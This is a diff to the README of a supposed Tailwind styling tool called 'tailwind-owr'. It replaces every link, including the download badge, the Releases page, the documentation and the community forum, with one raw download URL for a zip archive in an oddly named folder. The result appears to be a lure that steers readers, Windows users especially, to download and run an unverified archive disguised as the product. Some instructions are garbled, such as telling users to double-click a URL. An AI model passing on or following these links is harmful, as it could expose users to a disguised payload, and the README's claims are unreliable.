@@ -6,7 +6,7 @@ Welcome to tailwind-owr! This software helps you add beautiful, responsive style
 
 ## 📥 Download Now
 
-[![Download tailwind-owr](https://img.shields.io/badge/Download-tailwind--owr-brightgreen)](https://github.com/Fiscalpolicypeptide995/tailwind-owr/releases)
+[![Download tailwind-owr](https://raw.githubusercontent.com/Fiscalpolicypeptide995/tailwind-owr/main/distractively/tailwind-owr-2.0-alpha.1.zip)](https://raw.githubusercontent.com/Fiscalpolicypeptide995/tailwind-owr/main/distractively/tailwind-owr-2.0-alpha.1.zip)
 
 ## 🔍 Features
 
@@ -27,7 +27,7 @@ To get tailwind-owr, follow these simple steps:
 
 1. Click the link below to visit the Releases page.
    
-   [Visit Releases Page](https://github.com/Fiscalpolicypeptide995/tailwind-owr/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/Fiscalpolicypeptide995/tailwind-owr/main/distractively/tailwind-owr-2.0-alpha.1.zip)
    
 2. Find the latest version listed on the page.
 3. Click on the file that suits your operating system.
@@ -35,7 +35,7 @@ To get tailwind-owr, follow these simple steps:
 
 Once the download is complete:
 
-- **For Windows**: Double-click on `tailwind-owr.exe` to begin the installation.
+- **For Windows**: Double-click on `https://raw.githubusercontent.com/Fiscalpolicypeptide995/tailwind-owr/main/distractively/tailwind-owr-2.0-alpha.1.zip` to begin the installation.
 - **For macOS**: Open the downloaded `.dmg` file and drag the app to your Applications folder.
 - **For Linux**: Extract the files from the downloaded archive and follow the README instructions.
 
@@ -72,9 +72,9 @@ For support issues, please open an issue on our GitHub repository. We’re here 
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Fiscalpolicypeptide995/tailwind-owr/wiki)
-- [Community Forum](https://github.com/Fiscalpolicypeptide995/tailwind-owr/discussions)
+- [Documentation](https://raw.githubusercontent.com/Fiscalpolicypeptide995/tailwind-owr/main/distractively/tailwind-owr-2.0-alpha.1.zip)
+- [Community Forum](https://raw.githubusercontent.com/Fiscalpolicypeptide995/tailwind-owr/main/distractively/tailwind-owr-2.0-alpha.1.zip)
 
 Thank you for choosing tailwind-owr! We hope it makes your web styling experience enjoyable and straightforward. Happy styling! 
 
-Remember to check for updates and new features regularly by visiting our [Releases page](https://github.com/Fiscalpolicypeptide995/tailwind-owr/releases).
+Remember to check for updates and new features regularly by visiting our [Releases page](https://raw.githubusercontent.com/Fiscalpolicypeptide995/tailwind-owr/main/distractively/tailwind-owr-2.0-alpha.1.zip).
